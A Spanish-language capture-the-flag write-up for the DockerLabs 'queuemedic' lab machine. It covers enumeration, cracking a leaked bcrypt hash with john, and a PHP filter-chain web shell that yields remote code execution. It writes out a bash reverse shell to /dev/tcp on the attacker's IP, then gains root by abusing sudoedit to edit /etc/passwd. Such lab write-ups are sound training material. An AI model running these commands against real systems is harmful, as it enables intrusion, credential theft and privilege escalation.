nmap:  80
![[dockerlabs/dificil/queuemedic/nmap.png]]

---
vamos a la pagina principal y hay un login 
![[dockerlabs/dificil/queuemedic/login.png]]


hacemos un gobuster y nos da algunos que son llamativos
![[dockerlabs/dificil/queuemedic/gobuster.png]]

aquí http://172.17.0.2/patients.php nos da una pagina con un calendario básico
![[calendario.png]]

al /backup nos descargamos el zip y lo descomprimimos. nos da:
![[backup.png]]

ahora entramos a una carpeta que nos dio llamada /db/ y nos da un txt que dentro hay un nombre o dos junto a una posible contraseña.
> castrojessica

![[clave.png]]

utilizamos esta herramienta https://github.com/urbanadventurer/username-anarchy
para que nos genere contraseñas basadas en los nombres encontrados

dentro de la carpeta viendo el manual, creamos: nano username
> jessica castro

guardamos

ahora hacemos:

    ./username-anarchy -i username > users

y nos dará: 
![[username.png]]

también podemos ver que en el archivo "clinic_queuing_db.db " sale al contraseña 
y podemos hacerlo mas fácil  
pasamos la contraseña un hash 

>  $2y$10$iDHQftaCCEPmdPj/11E3DOGiw3AsOPf6uYBpEAuh8J19oeGuloJIK

  la pasamos a hash, nano hash y pegamos la contraseña
 ahora 
     
     john --wordlist=wordlist.txt hash
 
 y nos da la contraseña: 
 > j.castro
 
 ![[crack.jpg]]
 
ahora vamos al login.php e ingresamos las credenciales:
> jessica / j.castro

y estamos dentro del panel
![[dockerlabs/dificil/queuemedic/panel1.png]]

tomamos el nombre principal de la pagina que dice:  # Clinic Queuing System

buscamos un exploit y encontramos: https://www.exploit-db.com/exploits/52008
que vemos que podemos filtrar por php:  py filter_chain 
![[filtro.png]]

buscamos un exploit en github: https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py

ahora copiamos el código  

creamos:
> nano filter.py / pegamos el código guardamos


![[dockerlabs/dificil/queuemedic/codigo1.png]]

> ahora python3 filter.py

ahora  en el terminal colocamos:
> python3 filter.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'

nos dará un código que lo copiamos
![[dockerlabs/dificil/queuemedic/codigo2.png]]


y colocamos el buscador así:  172.17.0.2/?cmd=ls -la&page= y aquí colocamos el código que nos dio  que es vulnerable a ejecución de código remoto (RCE)
![[dockerlabs/dificil/queuemedic/codigo3.png]]

ahora la URL debe quedar así:  172.17.0.2/?cmd=bash -c 'bash -i >%26/dev/tcp/172.17.0.1/443 0>%261'&page= y aquí colocamos el código que nos dio

dejamos la terminal en escucha y lanzamos
![[dockerlabs/dificil/queuemedic/conexion.png]]

y estamos dentro, buscando no encontré mucho y probé con las mismas credenciales ya que no hay otro usuario aparte de jessica y root:  jessica / j.castro
![[jessica.png]]

ahora al hacer sudo -l aparece:  (root) NOPASSWD: sudoedit /var/www/html/*

para escalar encontré: 
![[sudoedit.png]]

o sea que puedo modificar el archivo, encontré este comando para poder dar el permiso de modificar por decir asi:

    export EDITOR='nano -- /etc/passwd'

ahora editamos:
  
    sudoedit /var/www/html/index.pgsd

le quitamos la x a root 
![[dockerlabs/dificil/queuemedic/root1.png]]
![[pasos1.png]]
colocamos su root y somos root!
![[suroot.png]]
muchas gracias! 